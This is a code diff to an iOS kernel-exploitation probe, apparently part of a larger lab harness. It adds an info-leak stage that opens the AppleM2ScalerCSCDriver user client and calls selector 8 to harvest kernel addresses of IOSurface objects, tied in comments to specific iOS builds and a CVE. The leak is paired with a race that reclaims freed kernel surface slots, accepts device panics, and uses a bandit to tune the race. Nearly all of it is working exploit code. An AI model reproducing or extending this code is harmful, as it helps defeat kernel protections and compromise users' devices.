@@ -33,10 +33,47 @@
 //  kalloc-type client sites via the framework create path — the only
 //  auth-passing claim class per note 270 §2b/c.
 //
+//  v2 LEAK-GATE (this build): the claim law's own KVA-disclosure pairing —
+//  the M2ScalerCSCDriver selector-8 (iosaDiag) leak capture runs as the
+//  round's LEAK STAGE so the claim window can be PAIRED against a leak
+//  snapshot. Derived law (all from LabIntelOffsets rows, never hardcoded):
+//    - m2scaler.get_iosaDiag_sel (PROVEN-EXT): sel 8; the event_payload +0x18
+//      field leaks an IOSurface KVA — iOS<=26.5.2 live on 23F77, fixed 26.6
+//      (23G71), likely CVE-2026-64709.
+//    - t8150.m2scaler.leak8: the fn's own gate is cmp x2,#8 — the struct
+//      input is {u64} 8 BYTES (NOT p098's 16-byte {userVA,size} shape — that
+//      was the v5 run-failer); 23F77 twin 0x8a32040.
+//    - t8150.m2scaler.serializer: the OUT = the activity-queue serializer's
+//      records: +0x20 header, record stride 0x7c, and rec+0x18 =
+//      str x8,[x0,#0x18] — the RAW first-event qword passthrough, NO auth =
+//      the KVA disclosure class.
+//    - t8150.m2scaler.client30: one recorder site stores a +0x30-shaped
+//      client-ptr ([obj+0x1f10]+0x30-class list node) — the claim law's own
+//      [surface+0x30] field shape, so rec+0x30-class KV changes across the
+//      swap window are the claim-corruption observable.
+//  Honest classification: leaked KVs print as LAW: KVA DISCLOSURE CLASS —
+//  not kread; the honesty line is mandatory in every print that carries a
+//  leaked KV; hasKread=NO stays until a kread32-class receipt exists. If
+//  the out shape mismatches (kext version drift), the probe prints the
+//  hexdump honestly and HOLDs the pairing.
+//
+//  v2 bandit arms (LabBandit shared ledger): the four v1.2 race-shape arms
+//  are joined by the p110 domain arm pair leakgate-on / leakgate-off. On
+//  leakgate-on the leak stage runs pre-round (per-round pre/post snapshots;
+//  the IN FLIGHT stamp carries the leak-record count as the round's
+//  pre-window state; a claim-won round prints the claim-window leak DIFF —
+//  the +0x30-class KV changes = the claim-corruption observable, labeled
+//  proxy-class: names the objects, proves the corruption CLASS, no kread
+//  claim). On leakgate-off the tap is pure v1.2. The bandit learns whether
+//  leak-gating changes the claim rate.
+//
 //  PANIC RISK: accepted per lab protocol (Family-B IS a target outcome).
 //  Every round is fsync-marked BEFORE arming, so a post-panic reboot's
 //  p110_swapclaim_log.txt names the in-flight round unambiguously.
 //  STANDALONE TAP ONLY — never in the PATCH chain (AGENTS.md rule 9).
+//  The M2Scaler door is left OPEN for the process lifetime on leakgate-on
+//  (the P027/P098 delayed-teardown fault class fires ~1-2 s AFTER a door
+//  close — never closing it never arms that class; one tap per force-quit).
 //
 
 #import "P110SurfaceSwapClaim.h"
@@ -44,6 +81,7 @@
 #import "LabIntelOffsets.h"
 #import "LabLocalTime.h"
 #import "LabBandit.h"
+#import "LabRuntimeOffsets.h"
 
 #import <Foundation/Foundation.h>
 #import <CoreFoundation/CoreFoundation.h>
@@ -59,15 +97,25 @@
 #import <stdatomic.h>
 #import <mach/mach.h>
 #import <mach/thread_policy.h>
+#import <IOKit/IOKitLib.h>       /* dlsym'd calls still; only the UC types  */
 #import <sys/qos.h>
 
-#define P110_BUILD      @"p110-swapclaim-v1.2-bandit"
+#define P110_BUILD      @"p110-swapclaim-v2-leakgate"
 #define P110_ROUNDS     64
 #define P110_PREFILL_MAX  8     /* bandit arm room: prefill 6 (default) vs 8 */
 #define P110_PREFILL_DEF  6     /* the v1 shipped prefill(6) pop-law value   */
 #define P110_POP        2       /* fresh creates popped AT the window        */
 #define P110_DIAL_MAX   20000   /* ns spin cap for the 267 v10 dial law    */
 #define P110_GO_TIMEOUT_MS 2000 /* bounded: one window per round           */
+
+/* ---- v2 leak-gate constants (the derived M2ScalerCSC sel-8 law) --------- */
+#define P110_LEAK_HDR     0x20     /* serializer out header before rec 0    */
+#define P110_LEAK_STRIDE  0x7c     /* record stride (the serializer law)    */
+#define P110_LEAK_KV18    0x18     /* rec+0x18 = RAW qword passthrough      */
+#define P110_LEAK_KV30    0x30     /* rec+0x30 = +0x30-class client-ptr     */
+#define P110_LEAK_SNAP    16       /* records held per snapshot             */
+#define P110_LEAK_OUT_MAX 0x10000  /* driver alloc (w+w9)*0x7c+0x20 cover   */
+#define P110_LEAK_PRINT   8        /* per-capture record print cap          */
 
 /* ---- framework types: dlsym only, never <IOSurface/IOSurface.h> ------- */
 typedef struct __IOSurface *IOSurfaceRef;
@@ -84,6 +132,38 @@ static IOSurfaceGetID_t          g_getid;
 static IOSurfaceGetBaseAddress_t g_base;
 static IOSurfaceGetAllocSize_t   g_alloc;
 static void (*g_release)(IOSurfaceRef);   /* IOSurfaceRelease or CFRelease */
+
+/* ---- v2 leak-gate: M2ScalerCSC sel-8 door state + snapshot type --------- */
+typedef struct {
+    int      n;                       /* records captured (capped at SNAP)   */
+    int      recs;                    /* derived record count from outLen    */
+    int      kv;                      /* KVA-disclosure-class count          */
+    uint64_t kv18[P110_LEAK_SNAP];    /* rec+0x18 raw passthrough values     */
+    uint64_t kv30[P110_LEAK_SNAP];    /* rec+0x30-class client-ptr values    */
+} P110LeakSnap;
+
+static P110LeakSnap g_p110_snap_pre, g_p110_snap_post;
+static BOOL g_p110_leakgate;          /* bandit arm 4 (leakgate-on)          */
+static BOOL g_p110_leak_ok;           /* shape confirmed at the validation capture */
+static int  g_p110_leak_recs;         /* pre-window record count (IN FLIGHT stamp) */
+static int  g_p110_leak_caps;         /* sel-8 captures this tap             */
+static int  g_p110_leak_pairs;        /* claim-window DIFFs printed          */
+static uint8_t g_p110_leak_out[P110_LEAK_OUT_MAX];   /* serializer out buffer  */
+
+/* IOKit via dlsym only (AGENTS landmine: no macOS-only headers; IOKitLib
+   symbols resolved at runtime like the p098 sibling)                    */
+typedef CFMutableDictionaryRef (*p110_IOMatching_t)(const char *);
+typedef io_service_t (*p110_IOGetSVC_t)(mach_port_t, CFDictionaryRef);
+static p110_IOMatching_t  g_p110_match;
+static p110_IOGetSVC_t    g_p110_getsvc;
+static kern_return_t (*g_p110_open)(io_service_t, task_port_t, uint32_t, io_connect_t *);
+static IOReturn (*g_p110_callStruct)(mach_port_t, uint32_t, const void *, size_t,
+                                     void *, size_t *);
+static IOReturn (*g_p110_objRelease)(io_object_t);
+static io_service_t g_p110_m2svc;
+static io_connect_t g_p110_m2conn;
+static BOOL g_p110_m2queued;
+static uint64_t g_p110_m2qh;          /* queue-create out q0 (best-effort)   */
 
 /* ---- run state --------------------------------------------------------- */
 static int      g_fd = -1;
@@ -122,10 +202,10 @@ static atomic_int v_aborted_proc;
 
 static NSMutableString *g_log = nil;
 
-/* ---- v1.2 bandit (LabBandit shared harness): one pick per tap -------------
-   Arms span the three race-shape knobs ALREADY in this file — no new race
+/* ---- v2 bandit (LabBandit shared harness): one pick per tap -----------------
+   v1.2 arms span the three race-shape knobs ALREADY in this file — no new race
    shapes (LabBandit law: arms = existing code paths, trivially gated). The
-   rounds inside one tap share the arm; the shared ledger
+   rounds inside one tap share it; the shared ledger
    (Documents/lab_bandit.json) learns across reboot cycles on both SKUs.
      0 "p6-dial0-popwin"   : prefill 6, dial pinned 0ns, +2 pop in-window
      1 "p6-b200-popwin"    : prefill 6, the +200ns exponential bump law
@@ -133,6 +213,14 @@ static NSMutableString *g_log = nil;
      2 "p8-b200-popwin"    : prefill 8, the +200ns bump law
      3 "p6-dial0-popearly" : prefill 6, dial 0, the SAME +2 fresh creates
                              issued EARLY pre-window (pop-timing calibration)
+     4 "leakgate-on"       : the v2 leak stage runs pre-round — the
+                             M2ScalerCSC sel-8 capture per round (pre/post
+                             snapshots; IN FLIGHT carries the leak-record
+                             count; claim-won prints the claim-window leak
+                             DIFF, the +0x30-class KV-change observable);
+                             race shape = the v1.2 law untouched
+     5 "leakgate-off"      : pure v1.2 (no leak stage) — the bandit learns
+                             whether leak-gating changes the claim rate
    Outcomes = the existing (a)/(b)/(c) words on the shared reward map:
    window-lost / family-b / claim-won (+ "abort" = the bounded re-park /
    unwind stops). The (b) class is recorded by LabBandit's dirty-boot
@@ -141,13 +229,15 @@ static NSMutableString *g_log = nil;
    boot = the in-process SIGBUS/EFAULT-class (b) catch killed the process
    (the only exit that leaves the round open; a force-quit looks identical —
    the log's handler line names the round). */
-static const char *const g_p110_arms[4] = {
-    "p6-dial0-popwin", "p6-b200-popwin", "p8-b200-popwin", "p6-dial0-popearly"
+static const char *const g_p110_arms[6] = {
+    "p6-dial0-popwin", "p6-b200-popwin", "p8-b200-popwin", "p6-dial0-popearly",
+    "leakgate-on", "leakgate-off"
 };
 static int  g_p110_arm;                       /* one arm per tap             */
 static int  g_p110_prefillN = P110_PREFILL_DEF;
 static BOOL g_p110_dialBase0;                 /* arms 0/3: the dial stays 0  */
 static BOOL g_p110_popEarly;                  /* arm 3: +2 pop pre-window    */
+static BOOL g_p110_leakStage;                 /* arms 4: the leak stage runs */
 static const LabBanditSeedRow g_p110_seeds[] = {
     /* documented p110 claim-oracle history, approximate and honestly
        labeled by the seeded_from string: the v1/v1.1 ledger note — 113
@@ -159,12 +249,16 @@ static void p110_arm_apply(void) {
     g_p110_prefillN = P110_PREFILL_DEF;
     g_p110_dialBase0 = NO;
     g_p110_popEarly = NO;
+    g_p110_leakStage = NO;
     switch (g_p110_arm) {
         case 0: g_p110_dialBase0 = YES; break;
         case 2: g_p110_prefillN = 8; break;
         case 3: g_p110_dialBase0 = YES; g_p110_popEarly = YES; break;
-        default: break;   /* case 1 = the v1.1 law verbatim */
+        case 4: g_p110_leakStage = YES; break;   /* leakgate-on: v1.2 race law
+                                                    + the sel-8 leak stage     */
+        default: break;   /* cases 1/5 = the v1.2 law verbatim (5 = pure) */
     }
+    g_p110_leakgate = g_p110_leakStage;
 }
 
 /* ---- fsync log: every line hits disk before the probe continues -------- */
@@ -341,6 +435,212 @@ static void *p110_t_reclaim(void *arg) {
     return NULL;
 }
 
+/* ---- v2 LEAK STAGE: M2ScalerCSC selector 8 (the derived leak law) --------
+   Every kernel-range KV printed anywhere below is evidence in the LAW: KVA
+   DISCLOSURE CLASS — not kread; hasKread=NO until a kread32-class receipt
+   exists. The out shape is TOLERATED: on kext version drift the hexdump is
+   printed honestly and the pairing HELDs (race rounds continue unpaired). */
+
+static mach_port_t g_p110_main;       /* kIOMainPortDefault value            */
+
+static BOOL p110_kernelish(uint64_t v) {
+    return (v >= 0xFFFFFE0000000000ULL && v < 0xFFFFFFF000000000ULL) ||
+           (v >= 0xFFFFFFF000000000ULL);
+}
+
+static BOOL p110_leak_iosyms(void) {
+    if (g_p110_match) return YES;
+    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW);
+    if (!iokit) iokit = RTLD_DEFAULT;
+    g_p110_match      = (p110_IOMatching_t)dlsym(iokit, "IOServiceMatching");
+    g_p110_getsvc     = (p110_IOGetSVC_t)dlsym(iokit, "IOServiceGetMatchingService");
+    g_p110_open       = (kern_return_t (*)(io_service_t, task_port_t, uint32_t, io_connect_t *))dlsym(iokit, "IOServiceOpen");
+    g_p110_callStruct = (IOReturn (*)(mach_port_t, uint32_t, const void *, size_t, void *, size_t *))dlsym(iokit, "IOConnectCallStructMethod");
+    g_p110_objRelease = (IOReturn (*)(io_object_t))dlsym(iokit, "IOObjectRelease");
+    mach_port_t (*pm)(void) = (mach_port_t (*)(void))dlsym(iokit, "kIOMainPortDefault");
+    if (pm) g_p110_main = *(volatile mach_port_t *)pm;
+    return g_p110_match && g_p110_getsvc && g_p110_open && g_p110_callStruct;
+}
+
+/* door open: IOServiceOpen AppleM2ScalerCSCDriver type 0, once per tap.
+   The door is NEVER closed on this tap (P027/P098 law: the delayed async
+   teardown fault fires ~1-2 s AFTER a close — never closing never arms it;
+   one tap per force-quit).                                            */
+static BOOL p110_leak_door(void) {
+    if (g_p110_m2conn) return YES;
+    if (!p110_leak_iosyms()) {
+        L(@"[leak] IOKit dlsym incomplete — leak stage HOLDs, race continues");
+        return NO;
+    }
+    CFMutableDictionaryRef m = g_p110_match("AppleM2ScalerCSCDriver");
+    io_service_t svc = m ? g_p110_getsvc(g_p110_main, m) : 0;
+    if (!svc) {
+        L(@"[leak] AppleM2ScalerCSCDriver service not present on this boot — "
+          @"leak stage HOLDs, race continues (honest miss)");
+        return NO;
+    }
+    g_p110_m2svc = svc;
+    kern_return_t kr = g_p110_open(svc, mach_task_self(), 0, &g_p110_m2conn);
+    (void)g_p110_objRelease(svc);   /* the GetMatchingService +1 ref; the
+                                       door lives in the UC connection    */
+    Lf(@"[leak] IOServiceOpen AppleM2ScalerCSCDriver type=0 kr=0x%x conn=%d", kr, g_p110_m2conn);
+    return (kr == KERN_SUCCESS && g_p110_m2conn);
+}
+
+/* queue create (sel 6) — p098 v5 law: sel-8 with no queue on the connection
+   reads zero bytes and rejects; the row size comes from LabOff() (0x410 =
+   23F77 class / 0x408 twin; 0 = row absent -> the 0x408 fallback, honest). */
+static void p110_leak_queue(void) {
+    if (g_p110_m2queued || !g_p110_m2conn) return;
+    g_p110_m2queued = YES;
+    const LabOffTab *off = LabOff();
+    uint32_t qsz = off ? (uint32_t)off->queue_create_size : 0;
+    if (!qsz) qsz = 0x408u;
+    if (qsz > 0x410u) qsz = 0x410u;
+    static uint8_t qBuf[0x410];
+    memset(qBuf, 0, sizeof(qBuf));
+    size_t qOutLen = sizeof(qBuf);
+    uint64_t qOut[4] = {0};
+    kern_return_t krQ = g_p110_callStruct(g_p110_m2conn, 6, qBuf, qsz, qOut, &qOutLen);
+    g_p110_m2qh = qOut[0];
+    Lf(@"[leak] QueueCreate sel=6 stIn=0x%x (LabOff row; 0x410=23F77 class) zeros "
+       @"kr=0x%x outLen=%zu out0=%016llx (the {u64} input candidate)",
+       qsz, krQ, qOutLen, (unsigned long long)qOut[0]);
+}
+
+static void p110_leak_hexdump(size_t maxn) {
+    size_t len = P110_LEAK_OUT_MAX < maxn ? P110_LEAK_OUT_MAX : maxn;
+    for (size_t row = 0; row < len; row += 16) {
+        NSMutableString *hex = [NSMutableString string];
+        for (size_t i = 0; i < 16 && row + i < len; i++)
+            [hex appendFormat:@"%02x%s", g_p110_leak_out[row + i], (i == 15) ? "" : " "];
+        Lf(@"[leak hexdump] +0x%04zx: %@", row, hex);
+    }
+}
+
+/* one sel-8 capture. print=YES = the full KV table (the leak stage's own
+   law print); print=NO = one summary line (the per-round taps).
+   Returns YES only when the shape held (stride law + header present).   */
+static BOOL p110_leak_capture(NSString *tag, BOOL print, P110LeakSnap *snap) {
+    if (!snap) return NO;
+    memset(snap, 0, sizeof(*snap));
+    if (!p110_leak_door()) return NO;
+    if (!g_p110_m2queued) p110_leak_queue();
+    memset(g_p110_leak_out, 0, sizeof(g_p110_leak_out));
+    uint64_t in64 = g_p110_m2qh;            /* the {u64} 8-byte input law    */
+    size_t outLen = sizeof(g_p110_leak_out);
+    IOReturn kr = g_p110_callStruct(g_p110_m2conn, 8, &in64, sizeof(in64),
+                                    g_p110_leak_out, &outLen);
+    g_p110_leak_caps++;
+
+    size_t need = P110_LEAK_HDR + P110_LEAK_STRIDE;
+    if (kr != KERN_SUCCESS || outLen < need ||
+        ((outLen - P110_LEAK_HDR) % P110_LEAK_STRIDE) != 0) {
+        Lf(@"[leak %@] OUT SHAPE MISMATCH (tolerant law): sel=8 in={%016llx} 8B "
+           @"kr=0x%08x outLen=%zu — kext version drift class; hexdump follows, "
+           @"pairing HELD, race rounds continue",
+           tag, (unsigned long long)in64, kr, outLen);
+        p110_leak_hexdump(0x40);
+        return NO;
+    }
+    int recs = (int)((outLen - P110_LEAK_HDR) / P110_LEAK_STRIDE);
+    snap->recs = recs;
+    g_p110_leak_recs = recs;
+    int n = recs < P110_LEAK_SNAP ? recs : P110_LEAK_SNAP;
+    snap->n = n;
+    for (int i = 0; i < n; i++) {
+        const uint8_t *rec = g_p110_leak_out + P110_LEAK_HDR + (size_t)i * P110_LEAK_STRIDE;
+        uint64_t v18, v30;
+        memcpy(&v18, rec + P110_LEAK_KV18, 8);   /* the RAW qword passthrough */
+        memcpy(&v30, rec + P110_LEAK_KV30, 8);   /* the +0x30-class client-ptr */
+        snap->kv18[i] = v18;
+        snap->kv30[i] = v30;
+        if (p110_kernelish(v18) || p110_kernelish(v30)) snap->kv++;
+    }
+
+    if (!print) {
+        Lf(@"[leak %@] sel=8 in={%016llx} 8B kr=0x%x outLen=%zu recs=%d "
+           @"kv-disclosure-class=%d (stride 0x7c law held)",
+           tag, (unsigned long long)in64, kr, outLen, snap->recs, snap->kv);
+        return YES;
+    }
+
+    /* the LEAK STAGE's own law print: the KV table + the mandatory honesty */
+    Lf(@"[leak %@] sel=8 in={%016llx} 8B ({u64} input law, row sin=8; NOT p098's "
+       @"16-byte {va,size} run-failer) kr=0x%x outLen=%zu -> records=%d "
+       @"(header 0x20 + n*0x7c serializer law)",
+       tag, (unsigned long long)in64, kr, outLen, snap->recs);
+    int pmax = snap->recs < P110_LEAK_PRINT ? snap->recs : P110_LEAK_PRINT;
+    for (int i = 0; i < pmax; i++) {
+        Lf(@"[leak %@] rec[%d] +0x18=%016llx%s +0x30=%016llx%s",
+           tag, i,
+           (unsigned long long)snap->kv18[i],
+           p110_kernelish(snap->kv18[i]) ? " KVA" : "",
+           (unsigned long long)snap->kv30[i],
+           p110_kernelish(snap->kv30[i]) ? " KVA" : "");
+    }
+    if (snap->recs > pmax)
+        Lf(@"[leak %@] ... %d more records held in the snapshot (print cap %d)",
+           tag, snap->recs - pmax, P110_LEAK_PRINT);
+    if (snap->kv) {
+        L(@"LAW: KVA DISCLOSURE CLASS — not kread. These KVs are the sel-8 "
+          @"event_payload passthrough (rec+0x18 raw, no auth; t8150.m2scaler."
+          @"serializer law) — disclosure-class evidence ONLY. hasKread=NO stays "
+          @"until a kread32-class receipt exists; no success claim.");
+    } else {
+        L(@"[leak] no kernel-range KV in this capture's snapshot (honest null — "
+          @"perm-strip, input shape, or driver drift all possible; hexdump on "
+          @"mismatch only).");
+    }
+    return YES;
+}
+
+/* the PAIR OBSERVABLE: claim-window leak DIFF (the pre/post snapshots).
+   +0x30-class KV changes = the claim-corruption observable, labeled
+   proxy-class: names the objects, proves the corruption CLASS, no kread. */
+static void p110_leak_diff(int r) {
+    int pre  = g_p110_snap_pre .recs;
+    int post = g_p110_snap_post.recs;
+    int m = pre < post ? pre : post;
+    int c18 = 0, c30 = 0;
+    int shown = 0;
+    for (int i = 0; i < m && i < g_p110_snap_pre.n; i++) {
+        if (g_p110_snap_pre.kv18[i] != g_p110_snap_post.kv18[i]) c18++;
+        if (g_p110_snap_pre.kv30[i] != g_p110_snap_post.kv30[i]) c30++;
+    }
+    Lf(@"[pair r%d] CLAIM-WINDOW LEAK DIFF (pre -> post): recs %d -> %d, "
+       @"changed +0x18 KV=%d / +0x30-class KV=%d (%d records compared)",
+       r, pre, post, c18, c30, m);
+    for (int i = 0; i < m && i < g_p110_snap_pre.n && shown < 8; i++) {
+        if (g_p110_snap_pre.kv18[i] == g_p110_snap_post.kv18[i]) continue;
+        Lf(@"[pair r%d] rec[%d] +0x18 KV %016llx -> %016llx",
+           r, i,
+           (unsigned long long)g_p110_snap_pre.kv18[i],
+           (unsigned long long)g_p110_snap_post.kv18[i]);
+        shown++;
+    }
+    shown = 0;
+    for (int i = 0; i < m && i < g_p110_snap_pre.n && shown < 8; i++) {
+        if (g_p110_snap_pre.kv30[i] == g_p110_snap_post.kv30[i]) continue;
+        Lf(@"[pair r%d] rec[%d] +0x30-class KV %016llx -> %016llx",
+           r, i,
+           (unsigned long long)g_p110_snap_pre.kv30[i],
+           (unsigned long long)g_p110_snap_post.kv30[i]);
+        shown++;
+    }
+    if (c18 || c30) {
+        Lf(@"[pair r%d] OUTCOME (c) PAIR OBSERVABLE (proxy-class) — LAW: KVA "
+           @"DISCLOSURE CLASS — not kread: the KV changes name the objects and "
+           @"prove the corruption CLASS across the claim window (the +0x30-class "
+           @"= the claim law's own [surface+0x30]-shaped client-ptr field, "
+           @"t8150.m2scaler.client30 law). No kread claim; hasKread=NO stays "
+           @"until a kread32-class receipt exists.", r);
+    } else {
+        L(@"[pair] diff clean — no KV changes across this window (honest null; "
+          @"the claim evidence stays the alias/slot-reuse classes only)");
+    }
+}
+
 /* ---- intel-row law resolution (never hardcoded; the probe prints the law) */
 static NSString *p110_flags_law(void) {
     LabSku sku = [LabDeviceProfile detectedSku];
@@ -410,7 +710,7 @@ static NSString *p110_flags_law(void) {
        gate + dlsym below, so the knobs apply to every raced round. -------- */
     {
         char attr[256];
-        int a = LabBanditRegister("p110", g_p110_arms, 4, g_p110_seeds, 1,
+        int a = LabBanditRegister("p110", g_p110_arms, 6, g_p110_seeds, 1,
             "p110 claim-oracle v1/v1.1 rounds (approximate, honestly labeled): "
             "the 12:06-round ledger note — 113 accumulated process-lifetime "
             "window counts under the v1 shape; the other arms seed at zero",
@@ -482,10 +782,39 @@ static NSString *p110_flags_law(void) {
         char sc[512];
         if (LabBanditScores("p110", sc, sizeof sc) >= 0)
             Lf(@"[bandit] UCB1 %s", sc);
-        Lf(@"[bandit] arm=%s -> prefill=%d dial=%s pop=%s (Documents/lab_bandit.json)",
+        Lf(@"[bandit] arm=%s -> prefill=%d dial=%s pop=%s leakgate=%s "
+           @"(Documents/lab_bandit.json)",
            LabBanditArmName("p110", g_p110_arm), g_p110_prefillN,
            g_p110_dialBase0 ? "pinned-0ns" : "+200ns-bump-law",
-           g_p110_popEarly ? "EARLY-pre-window" : "in-window");
+           g_p110_popEarly ? "EARLY-pre-window" : "in-window",
+           g_p110_leakStage ? "ON (sel-8 leak stage + pairing)" : "OFF (pure v1.2)");
+    }
+
+    /* ---- v2 LEAK STAGE validation capture (leakgate-on arm only) ----
+       One sel-8 capture with the FULL KV table print = the leak law's own
+       law print. Shape mismatch (kext version drift) = hexdump + HOLD the
+       pairing (tolerant law); the race rounds continue unpaired either way.
+       The M2Scaler door is never closed on this tap (P027/P098 delayed-
+       teardown law). ----------------------------------------------- */
+    if (g_p110_leakStage) {
+        L(@"[leak law] M2ScalerCSCDriver sel-8 (iosaDiag): in = {u64} 8 BYTES "
+          @"(row sin=8; NOT p098's 16-byte {va,size} — the v5 run-failer); out = "
+          @"the activity-queue serializer records: +0x20 header, stride 0x7c, "
+          @"rec+0x18 = RAW first-event qword passthrough (no auth) = the leak "
+          @"of the IOSurface KVA class (m2scaler.get_iosaDiag_sel intel row; "
+          @"likely CVE-2026-64709, fixed 26.6/23G71). rec+0x30 = the +0x30-class "
+          @"client-ptr field (t8150.m2scaler.client30 law) = the claim law's own "
+          @"[surface+0x30] shape — the pairing observable.");
+        g_p110_leak_ok = p110_leak_capture(@"validate", YES, &g_p110_snap_pre);
+        if (g_p110_leak_ok)
+            L(@"[leak] law shape CONFIRMED — pairing ARMED for the claim windows "
+              @"(per-round pre/post snapshots; claim-won prints the leak DIFF)");
+        else
+            L(@"[leak] pairing HELD (tolerant law) — race rounds continue UNPAIRED; "
+              @"no pairing observable will print on claim-won rounds");
+    } else {
+        L(@"[leak] leakgate-off arm: pure v1.2 — no leak stage, no pairing "
+          @"(the bandit's control side for the leak-rate question)");
     }
 
     /* (b) userspace alias-path fault catcher */
@@ -570,15 +899,28 @@ static NSString *p110_flags_law(void) {
         Lf(@"[r %d/%d] sid=%08x alloc=%lld attach settled (outside window)",
            r, P110_ROUNDS, sid, g_alloc ? (long long)g_alloc(s) : -1);
 
+        /* v2 leak stage, pre-round: the pre-window leak snapshot — its record
+           count rides the IN FLIGHT stamp below as the round's pre-window
+           state (law: the leak stage runs BEFORE the window arms). */
+        if (g_p110_leakgate && g_p110_leak_ok)
+            (void)p110_leak_capture([NSString stringWithFormat:@"pre-r%d", r],
+                                    NO, &g_p110_snap_pre);
+
         /* in-flight marker: fsync'd BEFORE arming. If the device reboots on
            this line, the outcome was (b) = window WON, free slot (the
-           attested Family-B class). Honest print, no success claim.        */
+           attested Family-B class). Honest print, no success claim.
+           v2: the stamp carries the leak-record count as the round's
+           pre-window state (0 = no leak stage / pairing HELD).             */
         Lf(@"[r %d/%d] IN FLIGHT — D: owner-release sid=%08x (destroy-twin class) / "
            @"E: owner-release the round surface (detacher half) / P: pop(%d+2, %s) "
-           @"dial %ldns, same CPU. If the device reboots here: outcome (b), Family-B far "
-           @"0x0020000000000048 = window WON, free slot (attested class).",
+           @"dial %ldns, same CPU — leak-recs=%d (%s). If the device reboots here: "
+           @"outcome (b), Family-B far 0x0020000000000048 = window WON, free slot "
+           @"(attested class).",
            r, P110_ROUNDS, sid, g_p110_prefillN,
-           g_p110_popEarly ? "EARLY-pre-window" : "in-window", dial);
+           g_p110_popEarly ? "EARLY-pre-window" : "in-window", dial,
+           (g_p110_leakgate && g_p110_leak_ok) ? g_p110_leak_recs : 0,
+           (g_p110_leakgate && g_p110_leak_ok)
+               ? @"pre-window sel-8 snapshot" : @"no leak stage / pairing HELD");
 
         /* bandit arm 3 (popearly): the SAME +2 fresh creates issued EARLY,
            pre-window — the pop-timing calibration arm; everything else in
@@ -710,6 +1052,17 @@ static NSString *p110_flags_law(void) {
                @"success claim): %@", r, P110_ROUNDS, evidence);
             LabBanditRecord("p110", g_p110_arm, "claim-won");
             dial = 0;             /* a won window resets the dial (267 v10 law) */
+            /* v2 PAIR OBSERVABLE: claim-won -> the claim-window leak DIFF.
+               The post-window snapshot is taken NOW, after the window closed;
+               the +0x30-class KV changes = the claim-corruption observable
+               (proxy-class: names the objects, proves the corruption CLASS;
+               no kread claim — the LAW label is printed by the diff itself). */
+            if (g_p110_leakgate && g_p110_leak_ok &&
+                p110_leak_capture([NSString stringWithFormat:@"post-r%d", r],
+                                  NO, &g_p110_snap_post)) {
+                p110_leak_diff(r);
+                g_p110_leak_pairs++;
+            }
         } else {
             atomic_fetch_add(&v_win_lost, 1); atomic_fetch_add(&v_win_lost_proc, 1);
             if (g_p110_dialBase0) {
@@ -767,6 +1120,11 @@ static NSString *p110_flags_law(void) {
        @"family-b-in-process=%d aborted=%d (every tap this process, not reset)",
        atomic_load(&v_win_lost_proc), atomic_load(&v_claim_won_proc),
        atomic_load(&v_family_b_proc), atomic_load(&v_aborted_proc));
+    Lf(@"[v2 leak-gate] arm=%s: sel-8 captures=%d claim-window DIFFs=%d pairing=%s "
+       @"(M2ScalerCSC door left OPEN this tap — P027/P098 delayed-teardown law; one "
+       @"tap per force-quit)",
+       LabBanditArmName("p110", g_p110_arm), g_p110_leak_caps, g_p110_leak_pairs,
+       g_p110_leakgate ? (g_p110_leak_ok ? @"ARMED" : @"HELD (hexdump recorded)") : @"off");
     L(@"  (a) clean-no-anomaly      = window lost (honest print; dial bumped one slot per round)");
     L(@"  (b) Family-B-shaped fault = window WON, free slot. Two shapes: an in-process "
       @"SIGBUS/EFAULT-class catch on the alias path (printed above), or the device panic on "
@@ -778,7 +1136,10 @@ static NSString *p110_flags_law(void) {
       @"from this lane — the flag readback stays proxy-honest until a kread lane pairs "
       @"this door (note-152 m2scaler = the pairing candidate on 23F77).");
     L(@"HONESTY: kread=NO kwrite=NO hasKread=NO. Verdict = claim-oracle + refcount/flag "
-      @"corruption CLASS evidence; no success claim is made without flags/alias evidence.");
+      @"corruption CLASS evidence; no success claim is made without flags/alias evidence. "
+      @"v2: every leaked KV printed is LAW: KVA DISCLOSURE CLASS — not kread (the sel-8 "
+      @"event_payload passthrough); hasKread=NO stays until a kread32-class receipt "
+      @"exists. The (b) catch stays the sigaction law.");
 
     /* v1.2 bandit: close the open round (per-round outcomes recorded above;
        the summary is the session's dominant shape — a panic or the in-process
